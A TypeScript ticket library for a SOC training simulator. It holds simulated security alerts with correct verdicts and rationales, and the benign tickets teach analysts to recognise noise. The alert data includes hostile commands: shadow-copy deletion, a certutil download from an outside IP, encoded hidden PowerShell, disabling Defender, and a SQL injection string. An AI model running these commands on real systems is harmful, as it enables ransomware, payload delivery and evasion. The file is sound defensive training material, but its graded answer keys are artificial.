/**
 * SOC ticket library for the Ticket Queue Simulator.
 *
 * Each entry is a complete, self-consistent alert: the raw payload, the
 * verdict a competent analyst should reach, and the reasoning that justifies
 * it. Roughly a third are benign, because a queue where everything is a real
 * incident teaches the wrong instinct — recognising noise is the job.
 */

export type TicketSeverity = "CRITICAL" | "HIGH" | "MEDIUM" | "LOW";

export type TicketAction =
  | "CLOSED"
  | "ESCALATED"
  | "RESOLVED"
  | "IGNORED"
  | "MONITOR";

export type SocTicket = {
  category: string;
  severity: TicketSeverity;
  title: string;
  description: string;
  rawAlert: Record<string, unknown>;
  /** The verdict a competent analyst should reach. */
  correctAction: TicketAction;
  /** Why that verdict is right — shown after grading. */
  rationale: string;
  /** True when the alert is noise rather than a real incident. */
  isBenign: boolean;
};

/** SLA minutes by severity, matching the scoring rules in src/lib/tickets.ts. */
export const SLA_BY_SEVERITY: Record<TicketSeverity, number> = {
  CRITICAL: 60,
  HIGH: 240,
  MEDIUM: 480,
  LOW: 1440,
};

export const SOC_TICKETS: SocTicket[] = [
  // ── Genuine incidents ────────────────────────────────────────────────────
  {
    category: "RANSOMWARE",
    severity: "CRITICAL",
    title: "Mass file rename on FS-PROD-02 with shadow copy deletion",
    description:
      "File server is renaming files at ~400/minute with a uniform extension. Volume shadow copies were deleted two minutes before the renames began.",
    rawAlert: {
      source: "EDR",
      host: "FS-PROD-02",
      user: "SVC-BACKUP",
      processName: "vssadmin.exe",
      commandLine: "vssadmin.exe delete shadows /all /quiet",
      parentProcess: "cmd.exe",
      grandparentProcess: "winword.exe",
      fileOpsPerMinute: 412,
      newExtension: ".L0CK3D",
      mitre: ["T1490", "T1486"],
    },
    correctAction: "ESCALATED",
    rationale:
      "Shadow copy deletion followed by bulk renaming is ransomware mid-execution. The Word grandparent points at a macro-enabled document as the entry point. Contain the host immediately and escalate — this cannot wait for the SLA window.",
    isBenign: false,
  },
  {
    category: "CREDENTIAL_ACCESS",
    severity: "CRITICAL",
    title: "LSASS memory read by non-standard process on DC-01",
    description:
      "A process opened a handle to LSASS with read rights on a domain controller. The binary is not on the approved list.",
    rawAlert: {
      source: "Sysmon",
      eventId: 10,
      host: "DC-01",
      sourceImage: "C:\\Users\\Public\\dmp.exe",
      targetImage: "C:\\Windows\\System32\\lsass.exe",
      grantedAccess: "0x1010",
      user: "CORP\\jsmith",
      mitre: ["T1003.001"],
    },
    correctAction: "ESCALATED",
    rationale:
      "GrantedAccess 0x1010 is the classic credential-dumping pattern, and it is happening on a domain controller from a binary in a world-writable directory. Assume domain compromise until proven otherwise.",
    isBenign: false,
  },
  {
    category: "DATA_EXFIL",
    severity: "CRITICAL",
    title: "4.2 GB outbound transfer to unrecognised host after hours",
    description:
      "A workstation uploaded 4.2 GB over HTTPS to an IP with no business relationship, starting at 02:14 local time.",
    rawAlert: {
      source: "Firewall",
      host: "WKS-FIN-114",
      user: "CORP\\a.patel",
      dstIp: "185.220.101.44",
      dstAsn: "AS205100",
      dstPort: 443,
      bytesOut: 4_509_715_660,
      bytesIn: 82_140,
      durationMin: 47,
      startedAt: "02:14",
      mitre: ["T1041"],
    },
    correctAction: "ESCALATED",
    rationale:
      "A 55,000:1 outbound-to-inbound ratio at 02:14 to an unrelated ASN is exfiltration, not browsing. The finance workstation makes the data sensitivity high. Escalate and preserve the host.",
    isBenign: false,
  },
  {
    category: "PERSISTENCE",
    severity: "HIGH",
    title: "Scheduled task created to run encoded PowerShell at logon",
    description:
      "A new scheduled task runs a base64-encoded PowerShell command at every user logon.",
    rawAlert: {
      source: "Windows Security",
      eventId: 4698,
      host: "WKS-ENG-207",
      taskName: "\\Microsoft\\Windows\\UpdateOrchestrator\\SystemUpdate",
      command: "powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoA",
      trigger: "AtLogon",
      user: "CORP\\svc-deploy",
      mitre: ["T1053.005", "T1059.001"],
    },
    correctAction: "ESCALATED",
    rationale:
      "The task name mimics a legitimate Windows path but sits under a directory Windows does not use for this. Hidden, encoded PowerShell at logon is persistence. Decode the payload and escalate.",
    isBenign: false,
  },
  {
    category: "LATERAL_MOVEMENT",
    severity: "HIGH",
    title: "Single account authenticating to 27 hosts in nine minutes",
    description:
      "A service account produced successful network logons across 27 distinct hosts in a nine-minute window.",
    rawAlert: {
      source: "Windows Security",
      eventId: 4624,
      logonType: 3,
      user: "CORP\\svc-scan",
      distinctHosts: 27,
      windowMinutes: 9,
      sourceHost: "WKS-IT-004",
      mitre: ["T1021.002"],
    },
    correctAction: "ESCALATED",
    rationale:
      "The spread is consistent with credential reuse across the estate. Confirm with the owning team whether a scan was authorised — but the source being a workstation rather than the scanning server argues against it.",
    isBenign: false,
  },
  {
    category: "PHISHING",
    severity: "HIGH",
    title: "Credential harvest page reached by six users in one hour",
    description:
      "Six staff members loaded a page that clones the corporate SSO portal. Two submitted a form.",
    rawAlert: {
      source: "Secure Web Gateway",
      url: "https://corp-sso-login.verify-account[.]net/auth",
      certIssuer: "Let's Encrypt",
      domainAgeDays: 2,
      usersReached: 6,
      formSubmissions: 2,
      referrer: "mail.google.com",
      mitre: ["T1566.002"],
    },
    correctAction: "ESCALATED",
    rationale:
      "A two-day-old domain impersonating SSO with confirmed form submissions means two sets of credentials are likely burnt. Force password resets for the submitting users and block the domain.",
    isBenign: false,
  },
  {
    category: "PRIVILEGE_ESCALATION",
    severity: "HIGH",
    title: "Standard user added to Domain Admins outside change window",
    description:
      "A non-privileged account was added to Domain Admins at 23:47, with no change ticket attached.",
    rawAlert: {
      source: "Windows Security",
      eventId: 4728,
      group: "Domain Admins",
      addedMember: "CORP\\t.wright",
      performedBy: "CORP\\admin-legacy",
      host: "DC-02",
      timestamp: "23:47",
      changeTicket: null,
      mitre: ["T1098"],
    },
    correctAction: "ESCALATED",
    rationale:
      "Privileged group changes outside a change window with no ticket are treated as compromise until the performing admin confirms otherwise. The legacy admin account is itself worth reviewing.",
    isBenign: false,
  },
  {
    category: "MALWARE",
    severity: "HIGH",
    title: "Office macro spawning certutil download",
    description:
      "Excel spawned certutil to download a payload from a raw file-hosting URL.",
    rawAlert: {
      source: "Sysmon",
      eventId: 1,
      host: "WKS-HR-052",
      parentProcess: "excel.exe",
      processName: "certutil.exe",
      commandLine:
        "certutil.exe -urlcache -split -f http://45.87.212.9/p.txt C:\\Users\\Public\\p.exe",
      user: "CORP\\l.okafor",
      mitre: ["T1105", "T1218.010"],
    },
    correctAction: "ESCALATED",
    rationale:
      "certutil as a downloader from an Office parent is a well-known living-off-the-land pattern. The payload has already landed on disk — isolate before it executes.",
    isBenign: false,
  },
  {
    category: "CLOUD",
    severity: "HIGH",
    title: "S3 bucket policy changed to public read",
    description:
      "A production bucket holding customer exports had its policy changed to allow public read.",
    rawAlert: {
      source: "CloudTrail",
      eventName: "PutBucketPolicy",
      bucket: "meridian-customer-exports-prod",
      principal: "arn:aws:iam::441122:user/ci-deploy",
      sourceIp: "13.107.42.14",
      newGrant: "AllUsers:READ",
      mfaUsed: false,
      mitre: ["T1530"],
    },
    correctAction: "ESCALATED",
    rationale:
      "Customer data exposed publicly is a reportable event on a clock. Revert the policy first, then determine whether the CI credential was misused or simply misconfigured.",
    isBenign: false,
  },
  {
    category: "COMMAND_AND_CONTROL",
    severity: "HIGH",
    title: "Regular beaconing to a single host every 60 seconds",
    description:
      "A host has contacted the same external IP every 60 seconds for six hours with near-identical payload sizes.",
    rawAlert: {
      source: "NetFlow",
      host: "WKS-MKT-089",
      dstIp: "91.219.236.18",
      intervalSec: 60,
      jitterPct: 3,
      durationHours: 6,
      avgBytesOut: 412,
      avgBytesIn: 188,
      mitre: ["T1071.001"],
    },
    correctAction: "ESCALATED",
    rationale:
      "Three percent jitter over six hours is machine-generated, not human browsing. The small symmetric payloads are check-in traffic. Treat as an active implant.",
    isBenign: false,
  },
  {
    category: "INSIDER",
    severity: "MEDIUM",
    title: "Departing employee bulk-downloading from shared drive",
    description:
      "An employee serving notice downloaded 1,847 files from a department share in one session.",
    rawAlert: {
      source: "DLP",
      user: "CORP\\r.novak",
      filesAccessed: 1847,
      totalMb: 3120,
      share: "\\\\FS-PROD-01\\Sales",
      leaverDate: "in 9 days",
      copiedToRemovable: true,
      mitre: ["T1052.001"],
    },
    correctAction: "ESCALATED",
    rationale:
      "Bulk access plus removable media plus a known leave date is the standard data-theft pattern. This is an HR and Legal matter as much as a security one — escalate rather than closing it yourself.",
    isBenign: false,
  },
  {
    category: "WEB_ATTACK",
    severity: "MEDIUM",
    title: "SQL injection attempts against the customer portal",
    description:
      "Sustained injection attempts against a login endpoint from a single source. All were rejected by the WAF.",
    rawAlert: {
      source: "WAF",
      endpoint: "/api/v2/login",
      sourceIp: "203.0.113.77",
      attempts: 342,
      windowMinutes: 12,
      blocked: 342,
      samplePayload: "' OR 1=1-- -",
      mitre: ["T1190"],
    },
    correctAction: "MONITOR",
    rationale:
      "Every attempt was blocked, so there is no compromise to respond to, but 342 attempts is targeted rather than background scanning. Block the source and watch for a change in technique.",
    isBenign: false,
  },
  {
    category: "DEFENSE_EVASION",
    severity: "MEDIUM",
    title: "Windows Defender real-time protection disabled by script",
    description: "Real-time protection was turned off via PowerShell on a workstation.",
    rawAlert: {
      source: "Windows Defender",
      eventId: 5001,
      host: "WKS-DEV-311",
      command: "Set-MpPreference -DisableRealtimeMonitoring $true",
      user: "CORP\\d.mensah",
      userIsLocalAdmin: true,
      mitre: ["T1562.001"],
    },
    correctAction: "MONITOR",
    rationale:
      "Developers with local admin do disable AV for legitimate build reasons, so this is not automatically malicious. Confirm intent with the user and require re-enabling — but watch the host in the meantime.",
    isBenign: false,
  },
  {
    category: "DISCOVERY",
    severity: "MEDIUM",
    title: "Domain enumeration from a workstation",
    description:
      "A workstation ran a sequence of AD reconnaissance commands within two minutes.",
    rawAlert: {
      source: "Sysmon",
      host: "WKS-SUP-023",
      commands: [
        "net group \"Domain Admins\" /domain",
        "net user /domain",
        "nltest /dclist:corp.local",
      ],
      user: "CORP\\h.silva",
      windowSeconds: 118,
      mitre: ["T1087.002", "T1018"],
    },
    correctAction: "ESCALATED",
    rationale:
      "This exact command sequence in under two minutes is tooling, not a curious user. It usually follows initial access — look for how the host was reached.",
    isBenign: false,
  },
  {
    category: "BRUTE_FORCE",
    severity: "MEDIUM",
    title: "Password spray against 190 accounts from one source",
    description:
      "A single external source attempted one password against 190 accounts. Three succeeded.",
    rawAlert: {
      source: "Azure AD",
      sourceIp: "45.155.205.233",
      accountsTargeted: 190,
      passwordsPerAccount: 1,
      successfulLogons: 3,
      windowMinutes: 22,
      mfaChallenged: 3,
      mfaPassed: 0,
      mitre: ["T1110.003"],
    },
    correctAction: "ESCALATED",
    rationale:
      "Three passwords are confirmed valid even though MFA held. Those credentials are burnt and must be reset. Low-and-slow spraying is deliberately shaped to stay under lockout thresholds.",
    isBenign: false,
  },

  // ── Benign — recognising noise is half the job ───────────────────────────
  {
    category: "FALSE_POSITIVE",
    severity: "HIGH",
    title: "EDR flags signed backup agent as credential dumper",
    description:
      "The backup agent read process memory during a scheduled job and triggered a credential-access rule.",
    rawAlert: {
      source: "EDR",
      host: "FS-PROD-01",
      processName: "veeamagent.exe",
      signer: "Veeam Software Group GmbH",
      signatureValid: true,
      path: "C:\\Program Files\\Veeam\\Backup\\veeamagent.exe",
      scheduledJob: "NIGHTLY-FULL",
      runAt: "01:00",
      matchedRule: "Credential dumping heuristic",
    },
    correctAction: "CLOSED",
    rationale:
      "Validly signed vendor binary, correct install path, running inside its scheduled window. This is a tuning problem, not an incident — close it and raise a rule exclusion.",
    isBenign: true,
  },
  {
    category: "FALSE_POSITIVE",
    severity: "MEDIUM",
    title: "Vulnerability scanner triggers IDS across the estate",
    description:
      "The authorised scanner produced thousands of IDS signature hits during its scheduled window.",
    rawAlert: {
      source: "IDS",
      sourceIp: "10.20.0.15",
      sourceHostname: "SEC-SCANNER-01",
      signaturesTriggered: 4128,
      distinctTargets: 612,
      windowStart: "Sunday 02:00",
      changeTicket: "CHG-20261-SCAN",
      mitre: [],
    },
    correctAction: "CLOSED",
    rationale:
      "Known scanner, its own IP, inside the approved window, with a change ticket. Closing this correctly is as important as catching a real one — chasing it wastes the shift.",
    isBenign: true,
  },
  {
    category: "FALSE_POSITIVE",
    severity: "MEDIUM",
    title: "Impossible travel explained by corporate VPN egress",
    description:
      "A user appeared to sign in from London and Frankfurt eleven minutes apart.",
    rawAlert: {
      source: "Azure AD",
      user: "CORP\\m.eriksson",
      logon1: { city: "London", ip: "51.140.22.8", time: "09:02" },
      logon2: { city: "Frankfurt", ip: "51.116.44.19", time: "09:13" },
      bothIpsCorporateVpn: true,
      mfaPassed: true,
      deviceCompliant: true,
    },
    correctAction: "CLOSED",
    rationale:
      "Both addresses belong to corporate VPN egress; the user's traffic simply re-homed to another gateway. MFA passed on a compliant device. Impossible travel needs the egress topology as context.",
    isBenign: true,
  },
  {
    category: "FALSE_POSITIVE",
    severity: "LOW",
    title: "PowerShell execution policy change during software deployment",
    description:
      "Execution policy was set to Bypass on 40 hosts by the deployment tool.",
    rawAlert: {
      source: "Sysmon",
      command: "powershell.exe -ExecutionPolicy Bypass -File install.ps1",
      parentProcess: "ccmexec.exe",
      hostCount: 40,
      user: "NT AUTHORITY\\SYSTEM",
      deploymentId: "SCCM-PKG-4471",
    },
    correctAction: "CLOSED",
    rationale:
      "The SCCM agent is the parent and the deployment ID matches an approved package. Bypass is how software deployment works — the parent process is what separates this from an attack.",
    isBenign: true,
  },
  {
    category: "FALSE_POSITIVE",
    severity: "LOW",
    title: "Expired certificate warning on internal monitoring endpoint",
    description: "An internal-only endpoint is serving an expired self-signed certificate.",
    rawAlert: {
      source: "Vulnerability Scanner",
      host: "MON-INT-02.corp.local",
      port: 8443,
      finding: "Expired TLS certificate",
      expiredDaysAgo: 34,
      internetFacing: false,
      selfSigned: true,
    },
    correctAction: "RESOLVED",
    rationale:
      "A real hygiene issue but not a security incident: internal only, self-signed, no exposure. Raise it with the owning team as maintenance rather than consuming triage capacity.",
    isBenign: true,
  },
  {
    category: "POLICY",
    severity: "LOW",
    title: "Personal cloud storage access from a corporate device",
    description: "A user accessed personal Dropbox from a managed laptop. No upload occurred.",
    rawAlert: {
      source: "CASB",
      user: "CORP\\j.adeyemi",
      service: "Dropbox (personal)",
      bytesUp: 0,
      bytesDown: 2_140_000,
      policyStatus: "Discouraged, not blocked",
    },
    correctAction: "RESOLVED",
    rationale:
      "Download-only with nothing leaving the organisation. This is an acceptable-use conversation for the line manager, not a security escalation.",
    isBenign: true,
  },
  {
    category: "FALSE_POSITIVE",
    severity: "LOW",
    title: "Legacy application triggers deprecated cipher alert",
    description: "An internal app negotiated TLS 1.0 with a known legacy partner endpoint.",
    rawAlert: {
      source: "Network Monitor",
      sourceHost: "APP-LEG-07",
      dstHost: "partner-gateway.example.net",
      tlsVersion: "1.0",
      knownException: "EXC-2025-118",
      exceptionExpires: "2027-01-31",
    },
    correctAction: "CLOSED",
    rationale:
      "There is an approved, in-date exception on record. Closing against a documented exception is correct; the exception's expiry is the thing worth tracking, not this alert.",
    isBenign: true,
  },
  {
    category: "NETWORK_ANOMALY",
    severity: "LOW",
    title: "Port scan from a guest wireless client",
    description:
      "A guest-network device scanned common ports. The guest VLAN is isolated from corporate.",
    rawAlert: {
      source: "Firewall",
      sourceIp: "172.31.99.204",
      vlan: "GUEST-ISOLATED",
      portsScanned: [22, 80, 443, 445, 3389],
      targetsReached: 0,
      blockedByVlanPolicy: true,
    },
    correctAction: "IGNORED",
    rationale:
      "The guest VLAN reached nothing because segmentation held. Worth noting the pattern, but there is no corporate exposure and no action to take.",
    isBenign: true,
  },
];

/** Even distribution so a shift is not accidentally all-critical. */
export function ticketsForShift(count: number, offset = 0): SocTicket[] {
  const out: SocTicket[] = [];
  for (let i = 0; i < count; i++) {
    out.push(SOC_TICKETS[(offset + i) % SOC_TICKETS.length]);
  }
  return out;
}
